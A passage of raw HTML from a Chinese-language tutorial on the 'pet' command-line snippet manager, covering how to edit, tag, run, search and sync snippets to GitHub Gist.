-o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c04168375587-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-i\">edit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c04168375587-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这将在你的默认文本编辑器中打开所有保存的代码片段，你可以根据需要编辑或更改片段。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c0a036320842\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[[snippets]]\r\n description = \"Remove numbers from output.\"\r\n command = \"echo 'Hell1o, Welcome1 2to OSTechNix4' | tr -d '1-9'\"\r\n output = \"\"\r\n\r\n[[snippets]]\r\n description = \"Alphabetically sort one line of text\"\r\n command = \"\\t prev\"\r\n output = \"\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c0a036320842-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c0a036320842-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c0a036320842-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c0a036320842-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c0a036320842-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c0a036320842-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c0a036320842-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c0a036320842-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c0a036320842-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c0a036320842-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c0a036320842-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">snippets</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c0a036320842-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">description</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Remove numbers from output.\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127c0a036320842-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">command</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"echo 'Hell1o, Welcome1 2to OSTechNix4' | tr -d '1-9'\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c0a036320842-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">output</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127c0a036320842-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c0a036320842-6\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">snippets</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127c0a036320842-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">description</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Alphabetically sort one line of text\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c0a036320842-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">command</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\\t prev\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127c0a036320842-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">output</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c0a036320842-10\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p></p>\n<h4 id=\"toc_7\">在片段中使用标签</h4>\n<p>要将标签用于判断，使用下面的 <code>-t</code> 标志。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c0e475205647\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet new -t\r\nCommand&gt; echo 'Hell1o, Welcome1 2to OSTechNix4' | tr -d '1-9\r\nDescription&gt; Remove numbers from output.\r\nTag&gt; tr command examples\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c0e475205647-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c0e475205647-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c0e475205647-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c0e475205647-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c0e475205647-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c0e475205647-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c0e475205647-2\"><span class=\"crayon-v\">Command</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'Hell1o, Welcome1 2to OSTechNix4'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tr</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span>'<span class=\"crayon-cn\">1</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127c0e475205647-3\"><span class=\"crayon-v\">Description</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Remove </span><span class=\"crayon-e\">numbers </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">output</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c0e475205647-4\"><span class=\"crayon-v\">Tag</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tr </span><span class=\"crayon-e\">command </span><span class=\"crayon-i\">examples</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127c0e475205647-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p></p>\n<h4 id=\"toc_8\">执行片段</h4>\n<p>要执行一个保存的片段，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c11734101677\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet exec\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c11734101677-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c11734101677-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c11734101677-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-i\">exec</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c11734101677-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>从列表中选择你要运行的代码段，然后按回车键来运行它：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/cf214a0ef38d5b40bc4432a0aade3021.png\" alt=\"\"></p>\n<p>记住你需要安装 fzf 或 peco 才能使用此功能。</p>\n<h4 id=\"toc_9\">寻找片段</h4>\n<p>如果你有很多要保存的片段，你可以使用字符串或关键词如 below.qjz 轻松搜索它们。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c14227111498\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet search\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c14227111498-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c14227111498-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c14227111498-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-i\">search</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c14227111498-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>输入搜索字词或关键字以缩小搜索结果范围。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/8d353e209372d40f943c717f666c5b28.png\" alt=\"\"></p>\n<h4 id=\"toc_10\">同步片段</h4>\n<p>首先，你需要获取访问令牌。转到此链接 <a href=\"https://github.com/settings/tokens/new\">https://github.com/settings/tokens/new</a> 并创建访问令牌（只需要 “gist” 范围）。</p>\n<p>使用以下命令来配置 Pet：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c17464334082\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet configure\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c17464334082-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c17464334082-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c17464334082-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-i\">configure</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c17464334082-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>将令牌设置到 <code>[Gist]</code> 字段中的 <code>access_token</code>。</p>\n<p>设置完成后，你可以像下面一样将片段上传到 Gist。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c1b237564854\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet sync -u\r\nGist ID: 2dfeeeg5f17e1170bf0c5612fb31a869\r\nUpload success\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c1b237564854-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c1b237564854-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c1b237564854-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c1b237564854-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c1b237564854-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-v\">sync</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c1b237564854-2\"><span class=\"crayon-e\">Gist </span><span class=\"crayon-v\">ID</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2dfeeeg5f17e1170bf0c5612fb31a869</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127c1b237564854-3\"><span class=\"crayon-e\">Upload </span><span class=\"crayon-i\">success</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c1b237564854-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>你也可以在其他 PC 上下载片段。为此，编辑配置文件并在 <code>[Gist]</code> 中将 <code>gist_id</code> 设置为 GIST id。</p>\n<p>之后，使用以下命令下载片段：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c1e911367429\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pet sync\r\nDownload success\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c1e911367429-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93127c1e911367429-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93127c1e911367429-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93127c1e911367429-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pet </span><span class=\"crayon-e\">sync</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93127c1e911367429-2\"><span class=\"crayon-e\">Download </span><span class=\"crayon-i\">success</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93127c1e911367429-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>获取更多细节，参阅帮助选项：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127c21659992829\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 